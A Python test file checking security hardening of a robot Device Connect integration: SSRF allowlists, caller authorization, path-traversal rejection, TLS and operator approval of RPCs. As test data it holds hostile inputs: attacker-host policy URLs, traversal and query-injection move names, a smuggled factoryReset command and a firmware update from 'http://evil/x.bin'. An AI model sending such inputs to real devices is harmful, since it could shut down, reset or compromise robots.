"""Security-hardening regression tests for the Device Connect integration.

Covers seven hardening improvements:
  - broadcast dispatches the validated command (no raw re-parse)
  - policy_provider restricted to the vetted allowlist (anti-SSRF)
  - device-native rpc action is HITL-gated
  - Reachy playMove move_name is path-traversal safe
  - Reachy daemon transport supports auth + warns when absent
  - state-mutating RPCs + emergencyStop are caller-authorized
  - transport is secure-by-default (insecure is explicit opt-in)

These use the REAL device_connect_edge package (editable install) so the
@rpc caller-identity contextvar hook is exercised end to end.
"""

import asyncio
import importlib
import sys

import pytest


def _force_real_device_connect_edge():
    """Restore the REAL device_connect_edge submodules and purge our
    integration modules so they re-bind to the real @rpc / DeviceDriver.

    Sibling test files (e.g. test_device_connect_drivers.py) replace
    device_connect_edge.drivers/types/device with MagicMocks at import time.
    To run order-independently we reload the genuine modules from disk and
    drop any strands_robots.device_connect.* cached against the mocks.
    """
    for key in (
        "device_connect_edge.drivers",
        "device_connect_edge.types",
        "device_connect_edge.device",
        "device_connect_edge",
    ):
        mod = sys.modules.get(key)
        # A real module has __file__; a MagicMock stand-in does not.
        if mod is not None and not hasattr(mod, "__file__"):
            sys.modules.pop(key, None)
    # Re-import genuine modules from disk.
    importlib.import_module("device_connect_edge")
    importlib.import_module("device_connect_edge.drivers")
    importlib.import_module("device_connect_edge.types")
    # Purge our integration so it re-imports against the real base classes.
    for key in list(sys.modules):
        if key.startswith("strands_robots.device_connect"):
            sys.modules.pop(key, None)


def _run(coro):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


# ── Fakes ─────────────────────────────────────────────────────────


class _FakeRobot:
    tool_name_str = "so100"

    def __init__(self):
        self.started = None
        self.stopped = False

    def start_task(self, instruction, policy_provider, policy_port, host, duration):
        self.started = dict(
            instruction=instruction,
            policy_provider=policy_provider,
            policy_port=policy_port,
            host=host,
            duration=duration,
        )
        return {"status": "success", "instruction": instruction}

    def stop_task(self):
        self.stopped = True
        return {"status": "success"}

    def get_task_status(self):
        return {"status": "idle"}


class _FakeWorldRobot:
    def __init__(self):
        self.policy_running = True


class _FakeWorld:
    def __init__(self):
        self.robots = {"r1": _FakeWorldRobot()}
        self.sim_time = 0.0
        self.step_count = 0


class _FakeSim:
    tool_name_str = "so100_sim"

    def __init__(self):
        self._world = _FakeWorld()
        self.started = None

    def start_policy(self, robot_name, policy_provider, instruction, duration):
        self.started = dict(
            robot_name=robot_name,
            policy_provider=policy_provider,
            instruction=instruction,
            duration=duration,
        )
        return {"status": "success"}

    def step(self, n):
        return {"status": "success", "stepped": n}

    def reset(self):
        return {"status": "success", "reset": True}


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch):
    _force_real_device_connect_edge()
    for var in (
        "DEVICE_CONNECT_RPC_ALLOW",
        "DEVICE_CONNECT_ESTOP_ALLOW",
        "DEVICE_CONNECT_ALLOW_INSECURE",
        "REACHY_DAEMON_TOKEN",
    ):
        monkeypatch.delenv(var, raising=False)
    # reset the one-time warning memos
    import strands_robots.device_connect._authz as az

    az._warned_permissive.clear()
    az._warned_insecure_acl.clear()
    yield


# ── policy_provider allowlist (anti-SSRF) ─────────────────────


def test_robot_execute_rejects_ssrf_policy_provider():
    from strands_robots.device_connect.robot_driver import RobotDeviceDriver

    d = RobotDeviceDriver(_FakeRobot())
    res = _run(d.execute("test", policy_provider="grpc://attacker.evil:9000", source_device="op-1"))
    assert res["status"] == "error"
    assert "policy_provider" in res["reason"]


def test_robot_execute_allows_vetted_provider():
    from strands_robots.device_connect.robot_driver import RobotDeviceDriver

    robot = _FakeRobot()
    d = RobotDeviceDriver(robot)
    res = _run(d.execute("pick cube", policy_provider="mock", source_device="op-1"))
    assert res["status"] == "success"
    assert robot.started["policy_provider"] == "mock"


def test_sim_execute_rejects_ssrf_policy_provider():
    from strands_robots.device_connect.sim_driver import SimulationDeviceDriver

    d = SimulationDeviceDriver(_FakeSim())
    res = _run(d.execute("test", policy_provider="ws://attacker", source_device="op-1"))
    assert res["status"] == "error"
    assert "policy_provider" in res["reason"]


# ── caller authorization ──────────────────────────────────────


def test_execute_denied_when_allowlist_set_and_caller_not_listed(monkeypatch):
    from strands_robots.device_connect.robot_driver import RobotDeviceDriver

    monkeypatch.setenv("DEVICE_CONNECT_RPC_ALLOW", "trusted-controller")
    d = RobotDeviceDriver(_FakeRobot())
    res = _run(d.execute("go", policy_provider="mock", source_device="rogue-sensor"))
    assert res["status"] == "error"
    assert "not authorized" in res["reason"]


def test_execute_allowed_for_listed_caller(monkeypatch):
    from strands_robots.device_connect.robot_driver import RobotDeviceDriver

    monkeypatch.setenv("DEVICE_CONNECT_RPC_ALLOW", "trusted-controller,safety-*")
    robot = _FakeRobot()
    d = RobotDeviceDriver(robot)
    res = _run(d.execute("go", policy_provider="mock", source_device="trusted-controller"))
    assert res["status"] == "success"
    # glob match
    res2 = _run(d.execute("go", policy_provider="mock", source_device="safety-007"))
    assert res2["status"] == "success"


def test_stop_denied_for_unlisted_caller(monkeypatch):
    from strands_robots.device_connect.robot_driver import RobotDeviceDriver

    monkeypatch.setenv("DEVICE_CONNECT_RPC_ALLOW", "ctrl")
    robot = _FakeRobot()
    d = RobotDeviceDriver(robot)
    res = _run(d.stop(source_device="rogue"))
    assert res["status"] == "error"
    assert robot.stopped is False


def test_sim_step_reset_denied_for_unlisted_caller(monkeypatch):
    from strands_robots.device_connect.sim_driver import SimulationDeviceDriver

    monkeypatch.setenv("DEVICE_CONNECT_RPC_ALLOW", "ctrl")
    d = SimulationDeviceDriver(_FakeSim())
    assert _run(d.step(n_steps=3, source_device="rogue"))["status"] == "error"
    assert _run(d.reset(source_device="rogue"))["status"] == "error"


def test_anonymous_caller_denied_when_allowlist_set(monkeypatch):
    """The reachable agent-path state: a caller with NO source identity
    (anonymous device-connect-agent-tools client => get_rpc_source_device()
    returns None) must be denied once an allowlist is configured. This is the
    end-to-end behaviour an operator sees when they lock the allowlist without
    giving the agent an id."""
    from strands_robots.device_connect.robot_driver import RobotDeviceDriver

    monkeypatch.setenv("DEVICE_CONNECT_RPC_ALLOW", "trusted-controller")
    robot = _FakeRobot()
    d = RobotDeviceDriver(robot)
    # No source_device kwarg => contextvar stays None, exactly like an
    # anonymous agent invoking over D2D.
    res = _run(d.execute("go", policy_provider="mock"))
    assert res["status"] == "error"
    assert "not authorized" in res["reason"]
    assert res["caller"] == "unknown"
    assert robot.started is None


def test_insecure_acl_logs_advisory_once(monkeypatch, caplog):
    """Under insecure transport, enforcing an allowlist against a self-asserted
    id must log a one-time advisory."""
    import logging

    import strands_robots.device_connect._authz as az

    monkeypatch.setenv("DEVICE_CONNECT_RPC_ALLOW", "ctrl")
    monkeypatch.setenv("DEVICE_CONNECT_ALLOW_INSECURE", "true")
    az._warned_insecure_acl.clear()
    with caplog.at_level(logging.WARNING, logger="strands_robots.device_connect._authz"):
        az.is_authorized_caller("ctrl", scope="rpc")
        az.is_authorized_caller("ctrl", scope="rpc")  # second call must not re-warn
    advisories = [r for r in caplog.records if "SELF-ASSERTED" in r.getMessage()]
    assert len(advisories) == 1


def test_secure_acl_no_insecure_advisory(monkeypatch, caplog):
    """With secure transport the self-asserted advisory must NOT fire."""
    import logging

    import strands_robots.device_connect._authz as az

    monkeypatch.setenv("DEVICE_CONNECT_RPC_ALLOW", "ctrl")
    monkeypatch.delenv("DEVICE_CONNECT_ALLOW_INSECURE", raising=False)
    az._warned_insecure_acl.clear()
    with caplog.at_level(logging.WARNING, logger="strands_robots.device_connect._authz"):
        az.is_authorized_caller("ctrl", scope="rpc")
    assert not [r for r in caplog.records if "SELF-ASSERTED" in r.getMessage()]


def test_permissive_when_no_allowlist(monkeypatch):
    # Out-of-the-box: no allowlist => allowed (with a logged warning).
    from strands_robots.device_connect.robot_driver import RobotDeviceDriver

    robot = _FakeRobot()
    d = RobotDeviceDriver(robot)
    res = _run(d.execute("go", policy_provider="mock", source_device="anyone"))
    assert res["status"] == "success"


def test_emergencystop_ignores_unauthorized_source(monkeypatch):
    from strands_robots.device_connect.robot_driver import RobotDeviceDriver

    monkeypatch.setenv("DEVICE_CONNECT_ESTOP_ALLOW", "safety-controller")
    robot = _FakeRobot()
    d = RobotDeviceDriver(robot)
    _run(d.onEmergencyStop("rogue-device", "emergencyStop", {}))
    assert robot.stopped is False
    _run(d.onEmergencyStop("safety-controller", "emergencyStop", {}))
    assert robot.stopped is True


# ── playMove path traversal ───────────────────────────────────


def _make_reachy():
    from strands_robots.device_connect import reachy_mini_driver as rmd

    drv = rmd.ReachyMiniDriver.__new__(rmd.ReachyMiniDriver)
    drv._host = "localhost"
    drv._api_port = 8000
    return drv, rmd


def test_playmove_rejects_path_traversal():
    drv, rmd = _make_reachy()
    captured = {}

    def fake_api(host, port, path, method="GET", data=None):
        captured["path"] = path
        return {"ok": True}

    rmd.api = fake_api  # patch module-level api used via asyncio.to_thread
    res = _run(drv.playMove("../../daemon/shutdown"))
    assert res["status"] == "error"
    assert "path" not in captured  # api() never called


def test_playmove_rejects_query_injection():
    drv, rmd = _make_reachy()
    res = _run(drv.playMove("x?admin=true&reset=1"))
    assert res["status"] == "error"


def test_playmove_allows_clean_name():
    drv, rmd = _make_reachy()
    captured = {}

    def fake_api(host, port, path, method="GET", data=None):
        captured["path"] = path
        return {"ok": True}

    rmd.api = fake_api
    res = _run(drv.playMove("happy_wiggle"))
    assert res["status"] == "success"
    assert captured["path"].endswith("/happy_wiggle")


# ── Reachy daemon auth ────────────────────────────────────────


def test_rest_api_adds_auth_header_when_token_set(monkeypatch):
    monkeypatch.setenv("REACHY_DAEMON_TOKEN", "s3cret")
    from strands_robots.device_connect import reachy_transport as rt

    importlib.reload(rt)
    captured = {}

    class _Resp:
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def read(self):
            return b"{}"

    def fake_urlopen(req, body, timeout):
        captured["auth"] = req.get_header("Authorization")
        return _Resp()

    monkeypatch.setattr("urllib.request.urlopen", fake_urlopen)
    rt.api("localhost", 8000, "/api/x")
    assert captured["auth"] == "Bearer s3cret"
    # cleanup: reload to restore module-level memo without token
    monkeypatch.delenv("REACHY_DAEMON_TOKEN", raising=False)
    importlib.reload(rt)


def test_token_helper_reads_env(monkeypatch):
    from strands_robots.device_connect import reachy_transport as rt

    importlib.reload(rt)
    assert rt._daemon_auth_token() is None
    monkeypatch.setenv("REACHY_DAEMON_TOKEN", "abc")
    assert rt._daemon_auth_token() == "abc"
    monkeypatch.delenv("REACHY_DAEMON_TOKEN", raising=False)


# ── Reachy daemon TLS (encryption in transit) ─────────────────


def test_tls_disabled_by_default(monkeypatch):
    monkeypatch.delenv("REACHY_DAEMON_TLS", raising=False)
    from strands_robots.device_connect import reachy_transport as rt

    importlib.reload(rt)
    assert rt._daemon_use_tls() is False
    assert rt._http_scheme() == "http"
    assert rt._ws_scheme() == "ws"


def test_tls_enables_secure_schemes(monkeypatch):
    from strands_robots.device_connect import reachy_transport as rt

    importlib.reload(rt)
    for spelling in ("1", "true", "TRUE", "yes", "on"):
        monkeypatch.setenv("REACHY_DAEMON_TLS", spelling)
        assert rt._daemon_use_tls() is True, spelling
        assert rt._http_scheme() == "https"
        assert rt._ws_scheme() == "wss"
    monkeypatch.delenv("REACHY_DAEMON_TLS", raising=False)


def test_rest_api_uses_https_url_when_tls_enabled(monkeypatch):
    monkeypatch.setenv("REACHY_DAEMON_TLS", "true")
    from strands_robots.device_connect import reachy_transport as rt

    importlib.reload(rt)
    captured = {}

    class _Resp:
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def read(self):
            return b"{}"

    def fake_urlopen(req, body, timeout, context=None):
        captured["url"] = req.full_url
        captured["has_ctx"] = context is not None
        return _Resp()

    monkeypatch.setattr("urllib.request.urlopen", fake_urlopen)
    rt.api("localhost", 8000, "/api/x")
    assert captured["url"].startswith("https://")
    assert captured["has_ctx"] is True
    monkeypatch.delenv("REACHY_DAEMON_TLS", raising=False)
    importlib.reload(rt)


def test_tls_verifies_certificate_by_default(monkeypatch):
    import ssl

    monkeypatch.setenv("REACHY_DAEMON_TLS", "true")
    monkeypatch.delenv("REACHY_DAEMON_TLS_INSECURE", raising=False)
    from strands_robots.device_connect import reachy_transport as rt

    importlib.reload(rt)
    assert rt._daemon_verify_tls() is True
    ctx = rt._build_ssl_context("WebSocket")
    assert ctx.verify_mode == ssl.CERT_REQUIRED
    assert ctx.check_hostname is True
    monkeypatch.delenv("REACHY_DAEMON_TLS", raising=False)


def test_tls_insecure_skips_verification_with_warning(monkeypatch, caplog):
    import logging
    import ssl

    monkeypatch.setenv("REACHY_DAEMON_TLS", "true")
    monkeypatch.setenv("REACHY_DAEMON_TLS_INSECURE", "true")
    from strands_robots.device_connect import reachy_transport as rt

    importlib.reload(rt)  # clears the functools.cache warn-once memo
    assert rt._daemon_verify_tls() is False
    with caplog.at_level(logging.WARNING):
        ctx = rt._build_ssl_context("WebSocket")
    assert ctx.verify_mode == ssl.CERT_NONE
    assert ctx.check_hostname is False
    assert any("verification is DISABLED" in r.message for r in caplog.records)
    monkeypatch.delenv("REACHY_DAEMON_TLS", raising=False)
    monkeypatch.delenv("REACHY_DAEMON_TLS_INSECURE", raising=False)
    importlib.reload(rt)


def test_websocket_link_uses_wss_when_tls_enabled(monkeypatch):
    monkeypatch.setenv("REACHY_DAEMON_TLS", "true")
    from strands_robots.device_connect import reachy_transport as rt

    importlib.reload(rt)
    captured = {}

    async def fake_connect(url, **kwargs):
        captured["url"] = url
        captured["kwargs"] = kwargs

        class _WS:
            def __aiter__(self):
                return self

            async def __anext__(self):
                raise StopAsyncIteration

        return _WS()

    import types

    fake_ws_mod = types.ModuleType("websockets")
    fake_ws_mod.connect = fake_connect
    monkeypatch.setitem(sys.modules, "websockets", fake_ws_mod)

    link = rt.WebSocketLink("reachy-mini.local", 8000)
    _run(link.start(on_joints=lambda d: None, on_imu=lambda d: None))
    assert captured["url"].startswith("wss://")
    assert "ssl" in captured["kwargs"]
    monkeypatch.delenv("REACHY_DAEMON_TLS", raising=False)
    importlib.reload(rt)


# ── secure-by-default resolution ──────────────────────────────


def test_allow_insecure_defaults_false():
    # Exercise the REAL resolver (not a re-implementation): unset env + no
    # explicit arg => secure.
    from strands_robots.device_connect import resolve_allow_insecure

    assert resolve_allow_insecure(None, None) is False


def test_allow_insecure_resolution_precedence():
    from strands_robots.device_connect import resolve_allow_insecure

    # explicit arg wins over everything
    assert resolve_allow_insecure(True, "false") is True
    assert resolve_allow_insecure(False, "true") is False
    # env var honoured when no explicit arg (truthy spellings)
    assert resolve_allow_insecure(None, "true") is True
    assert resolve_allow_insecure(None, "1") is True
    assert resolve_allow_insecure(None, "yes") is True
    # anything else is secure
    assert resolve_allow_insecure(None, "false") is False
    assert resolve_allow_insecure(None, "") is False


def test_init_device_connect_uses_secure_default():
    """The production entrypoint constructs the runtime secure-by-default when
    neither the arg nor the env var opt into insecure transport."""
    from unittest.mock import patch

    from strands_robots.device_connect import init_device_connect

    captured = {}

    class _FakeRuntime:
        def __init__(self, **kw):
            captured.update(kw)

        def set_heartbeat_provider(self, *_a, **_k):
            pass

        async def run(self):
            return None

    async def _go():
        with patch("strands_robots.device_connect.DeviceRuntime", _FakeRuntime):
            await init_device_connect(_FakeRobot(), peer_id="p1")

    _run(_go())
    assert captured["allow_insecure"] is False


def test_no_forced_insecure_setdefault_in_source():
    # The agent-side connector must NOT force insecure mode process-wide.
    import strands_robots.tools.robot_mesh as rm

    src = __import__("inspect").getsource(rm._dc_ensure_connected)
    assert 'setdefault("DEVICE_CONNECT_ALLOW_INSECURE"' not in src
    assert "setdefault('DEVICE_CONNECT_ALLOW_INSECURE'" not in src


# ── broadcast dispatches the validated command (no raw re-parse) ──


def test_broadcast_dispatch_uses_validated_command(monkeypatch):
    """The DC broadcast branch must use the validated command, never re-parse
    the raw caller string (which could differ from what was approved)."""
    from unittest.mock import MagicMock

    import strands_robots.tools.robot_mesh as rm

    conn = MagicMock(name="conn")
    conn.broadcast.return_value = [{"device_id": "d1", "result": {}}]
    monkeypatch.setattr(
        "device_connect_agent_tools.connection.get_connection",
        lambda: conn,
        raising=False,
    )

    # Raw string says factoryReset, but the validated command (what the
    # operator approved) is a benign status. Dispatch MUST use the validated one.
    raw = '{"function": "factoryReset", "confirm": true}'
    validated = {"action": "status"}
    res = rm._device_connect_dispatch("broadcast", "", "", raw, "mock", 0, 30.0, 30.0, "", validated)
    assert res is not None
    # broadcast called with the validated action, not factoryReset
    called_func = conn.broadcast.call_args[0][0]
    assert called_func == "status"
    assert called_func != "factoryReset"


def test_broadcast_dispatch_without_validated_command_is_rejected(monkeypatch):
    from unittest.mock import MagicMock

    import strands_robots.tools.robot_mesh as rm

    conn = MagicMock(name="conn")
    monkeypatch.setattr(
        "device_connect_agent_tools.connection.get_connection",
        lambda: conn,
        raising=False,
    )
    res = rm._device_connect_dispatch(
        "broadcast", "", "", '{"function":"factoryReset"}', "mock", 0, 30.0, 30.0, "", None
    )
    assert res["status"] == "error"
    conn.broadcast.assert_not_called()


# ── agent caller-identity propagation (Layer 1) ───────────────


def test_with_identity_noop_when_unset(monkeypatch):
    import strands_robots.tools.robot_mesh as rm

    monkeypatch.delenv("STRANDS_ROBOT_MESH_AGENT_ID", raising=False)
    monkeypatch.delenv("DEVICE_CONNECT_CLIENT_ID", raising=False)
    params = {"instruction": "go"}
    out = rm._with_identity(params)
    assert "_dc_meta" not in out  # anonymous caller, unchanged


def test_with_identity_stamps_source_device(monkeypatch):
    import strands_robots.tools.robot_mesh as rm

    monkeypatch.setenv("STRANDS_ROBOT_MESH_AGENT_ID", "trusted-controller")
    out = rm._with_identity({"instruction": "go"})
    assert out["_dc_meta"]["source_device"] == "trusted-controller"
    # does not clobber a caller-supplied _dc_meta source_device
    out2 = rm._with_identity({"_dc_meta": {"source_device": "explicit"}})
    assert out2["_dc_meta"]["source_device"] == "explicit"


def test_tell_invoke_carries_identity(monkeypatch):
    """End-to-end at the dispatch layer: a configured agent id rides along in
    the DC command envelope so the device's allowlist can match it."""
    from unittest.mock import MagicMock

    import strands_robots.tools.robot_mesh as rm

    monkeypatch.setenv("STRANDS_ROBOT_MESH_AGENT_ID", "trusted-controller")
    conn = MagicMock(name="conn")
    conn.invoke.return_value = {"result": {"status": "success"}}
    monkeypatch.setattr(
        "device_connect_agent_tools.connection.get_connection",
        lambda: conn,
        raising=False,
    )
    rm._device_connect_dispatch("tell", "dev-1", "pick up the cube", "", "mock", 0, 30.0, 30.0, "", None)
    params = conn.invoke.call_args[0][2]
    assert params["_dc_meta"]["source_device"] == "trusted-controller"
    assert params["instruction"] == "pick up the cube"


# ── device-native rpc action is HITL-gated ────────────────────


def test_rpc_is_interrupt_required():
    import strands_robots.tools.robot_mesh as rm

    assert "rpc" in rm._resolve_interrupt_actions()


def test_rpc_declined_by_operator_is_rejected(monkeypatch):
    """With DC disabled, an rpc action must still raise the HITL interrupt and
    fail closed when the operator declines."""
    from unittest.mock import MagicMock

    import strands_robots.tools.robot_mesh as rm

    monkeypatch.setenv("STRANDS_ROBOT_MESH_DC", "off")
    ctx = MagicMock(name="ToolContext")
    ctx.interrupt.return_value = "n"  # operator declines

    fn = getattr(rm.robot_mesh, "original", rm.robot_mesh)
    res = fn(
        action="rpc",
        tool_context=ctx,
        target="device-1",
        function="updateFirmware",
        command='{"url":"http://evil/x.bin"}',
    )
    assert res["status"] == "error"
    assert ctx.interrupt.called


def test_rpc_surfaces_function_in_interrupt(monkeypatch):
    from unittest.mock import MagicMock

    import strands_robots.tools.robot_mesh as rm

    monkeypatch.setenv("STRANDS_ROBOT_MESH_DC", "off")
    ctx = MagicMock(name="ToolContext")
    ctx.interrupt.return_value = "n"
    fn = getattr(rm.robot_mesh, "original", rm.robot_mesh)
    fn(action="rpc", tool_context=ctx, target="d1", function="nod")
    reason = ctx.interrupt.call_args.kwargs.get("reason", {})
    assert reason.get("function") == "nod"
